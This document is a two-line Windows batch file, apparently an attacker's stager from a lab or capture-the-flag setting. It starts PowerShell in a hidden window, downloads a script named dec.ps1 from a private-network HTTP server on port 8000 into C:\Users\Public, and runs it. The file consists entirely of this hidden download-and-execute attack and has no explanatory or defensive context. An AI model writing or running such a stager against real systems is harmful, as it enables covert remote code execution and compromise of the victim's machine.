@echo off
powershell -nop -w hidden -c "iwr http://10.10.15.62:8000/dec.ps1 -OutFile C:\Users\Public\dec.ps1; powershell -nop -File C:\Users\Public\dec.ps1"
